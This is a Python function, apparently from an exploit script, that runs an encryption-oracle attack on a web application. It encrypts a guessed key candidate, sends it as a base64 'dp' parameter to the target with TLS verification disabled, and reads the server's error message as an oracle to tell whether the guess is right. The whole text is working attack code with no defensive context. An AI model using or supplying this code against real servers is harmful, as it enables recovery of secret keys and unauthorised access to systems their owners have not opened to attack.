code: def get_result(plaintext, key, session, pad_chars): global requests_sent, char_requests url = args.url base_pad = (len(key) % 4) base = '' if base_pad == 0 else pad_chars[0:4 - base_pad] dp_encrypted = base64.b64encode( (encrypt(plaintext, key) + base).encode() ).decode() request = requests.Request('GET', url + '?dp=' + dp_encrypted) request = request.prepare() response = session.send(request, verify=False, proxies = getProxy(args.proxy)) requests_sent += 1 char_requests += 1 match = re.search("(Error Message:)(.+\n*.+)()", response.text) return True \ if match is not None \ and match.group(2) == args.oracle \ else False
